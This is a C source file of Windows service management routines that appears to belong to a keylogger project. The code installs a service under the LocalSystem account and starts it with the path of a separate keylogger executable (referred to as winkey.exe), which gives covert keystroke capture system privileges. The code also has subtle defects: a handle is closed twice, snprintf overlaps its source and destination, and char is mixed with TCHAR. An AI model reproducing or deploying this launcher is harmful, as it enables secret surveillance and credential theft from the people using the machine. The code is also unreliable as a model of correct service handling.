#include "svc.h"

void install_service(SC_HANDLE scm)
{
    TCHAR unquoted_path[MAX_PATH];

    // Retrieve the full path of the executable file for the current module.
    if (!GetModuleFileName(NULL, unquoted_path, MAX_PATH))
    {
        print_error("Failed to get module file name");
        return;
    }

    // Quote the path to handle any spaces in the file path.
    // For example, "d:\my share\myservice.exe" should be specified as
    // "\"d:\\my share\\myservice.exe\"".
    TCHAR path[MAX_PATH];
    StringCbPrintf(path, MAX_PATH, TEXT("\"%s\""), unquoted_path);

    // Create the service using the Service Control Manager handle.
    SC_HANDLE service = CreateService(
        scm,                          // Handle to the Service Control Manager (SCM)
        SVC_NAME,                     // Service name (short name used by the system)
        SVC_NAME,                     // Display name (name shown in the services console)
        SERVICE_ALL_ACCESS,           // Full access rights
        SERVICE_WIN32_OWN_PROCESS,    // Service type: runs in its own process
        SERVICE_DEMAND_START,         // Start type: manual start on demand
        SERVICE_ERROR_NORMAL,         // Error control: log error and continue startup
        path,                         // Path to the service executable
        NULL,                         // Load order group (NULL if not part of a group)
        NULL,                         // Tag ID (NULL if no unique tag is needed)
        NULL,                         // Dependencies (NULL if no dependencies)
        NULL,                         // Service start name (NULL for LocalSystem account)
        NULL                          // Password (NULL if not required)
    );

    // Check if the service creation failed.
    // If successful, print a success message; otherwise, print an error.
    if (service == NULL) {
        print_error("Failed to create {" SVC_NAME "} service");
    }
    else {
        printf("Service {" SVC_NAME "} installed successfully\n");
        CloseServiceHandle(service);
    }

    // Close the handle to the Service Control Manager.
    CloseServiceHandle(scm);
}

void start_service(SC_HANDLE scm)
{
    // Open a handle to the specified service with full access rights.
    // This handle is used to interact with the service (e.g., start, stop).
    SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
    if (service == NULL) {
        print_error("Failed to open {" SVC_NAME "} service");
        CloseServiceHandle(scm);
        return;
    }

    char keylogger_path[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, keylogger_path, MAX_PATH);

    // Find the last backslash in the path to isolate the directory portion.
    char* last_backslash = strrchr(keylogger_path, '\\');
    if (last_backslash) {
        *last_backslash = '\0';
    }

    // Construct the full path to winkey.exe by appending its name to the directory path.
    snprintf(keylogger_path, MAX_PATH, "%s\\" KEYLOGGER_NAME, keylogger_path);

    // Attempt to start the service.
    // The function StartService does not return until the service is either running or in a start-pending state.
    const char* args[] = { keylogger_path };
    if (!StartService(service, 1, args)) {
        print_error("Failed to start {" SVC_NAME "} service");
    }
    else {
        printf("Service {" SVC_NAME "} started succesfully\n");
    }

    // Close the handles to the service and SCM once operations are complete.
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
}

void stop_service(SC_HANDLE scm)
{
    // Open a handle to the specified service with stop rights.
    // This handle is used to interact with the service (specifically, to stop it).
    SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_STOP);
    if (service == NULL) {
        print_error("Failed to open {" SVC_NAME "} service");
        CloseServiceHandle(scm);
        return;
    }

    // Attempt to stop the service.
    // The ControlService function sends a control code (SERVICE_CONTROL_STOP) to the service to stop it.
    SERVICE_STATUS status;
    if (!ControlService(service, SERVICE_CONTROL_STOP, &status)) {
        print_error("Failed to stop {" SVC_NAME "} service");
    }
    else {
        printf("Service {" SVC_NAME "} stopped successfully\n");
    }

    // Close the handles to the service and SCM once operations are complete.
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
}

static BOOL is_service_running(SC_HANDLE service)
{
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytes_needed;

    // Query the status of the service to determine if it is running.
    // QueryServiceStatusEx retrieves detailed status information about the service.
    if (!QueryServiceStatusEx(
        service,                          // Handle to the service
        SC_STATUS_PROCESS_INFO,           // Information level, retrieves process information
        (LPBYTE)&ssp,                     // Buffer to receive the status information
        sizeof(SERVICE_STATUS_PROCESS),   // Size of the buffer
        &bytes_needed))                   // Number of bytes needed if buffer is too small
    {
        // If QueryServiceStatusEx fails, log the error and return FALSE.
        print_error("Failed to query the service status");
        return FALSE;
    }

    // Check if the service is currently running.
    return (ssp.dwCurrentState == SERVICE_RUNNING);
}

void delete_service(SC_HANDLE scm)
{
    // Open a handle to the specified service with all access rights.
    // This handle is used to delete the service.
    SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
    if (service == NULL) {
        // Log an error if opening the service fails.
        print_error("Failed to open {" SVC_NAME "} service");
        CloseServiceHandle(scm);
        return;
    }

    // Check if the service is currently running.
    // If it is, stop the service before attempting to delete it.
    if (is_service_running(service)) {
        stop_service(scm);
    }

    // Attempt to delete the service.
    // If DeleteService fails, log an error; otherwise, confirm successful deletion.
    if (!DeleteService(service)) {
        print_error("Failed to delete {" SVC_NAME "} service");
    }
    else {
        printf("Service {" SVC_NAME "} deleted successfully\n");
    }

    // Close the handles to the service and the Service Control Manager.
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
}
